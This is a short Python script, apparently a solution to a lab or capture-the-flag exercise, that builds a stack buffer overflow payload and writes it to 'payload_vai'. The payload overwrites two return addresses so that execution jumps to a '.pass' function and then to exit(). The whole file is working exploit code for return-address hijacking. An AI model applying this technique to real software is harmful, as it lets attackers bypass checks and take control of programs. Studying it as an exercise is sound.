import sys
import os

def main():
    # Padding to reach the first return address (ra)
    # The padding needed is offset + 8, where offset is 256.
    payload = b'A' * 264

    # Overwrite the first RA with the address of the .pass function
    # Little Endian representation of 0x000104e8
    payload += b'\xe8\x04\x01\x00\x00\x00\x00\x00'

    # Padding to reach the second return address (after jumping back to .end)
    payload += b'B' * 264

    # Overwrite the second RA with the address of the exit() function
    # Little Endian representation of 0x00010e14
    payload += b'\x14\x0e\x01\x00\x00\x00\x00\x00'

    # Ensure to output exactly this binary block into the target file!
    with open('payload_vai', 'wb') as f:
        f.write(payload)

if __name__ == '__main__':
    main()
